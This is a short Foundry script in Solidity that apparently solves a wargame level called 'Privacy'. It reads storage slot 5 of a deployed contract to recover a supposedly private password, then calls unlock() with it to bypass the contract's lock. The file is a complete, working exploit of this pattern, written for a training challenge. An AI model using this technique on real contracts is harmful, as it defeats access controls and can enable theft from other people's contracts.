// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacyHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address privacyIns = address(0xA8a4Fe1Ad89E92052C6eF388FdAD9d1131bf8381);
        bytes32 password = vm.load(privacyIns, bytes32(uint256(5)));
        privacyIns.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(password)));
        vm.stopBroadcast();
    }
}
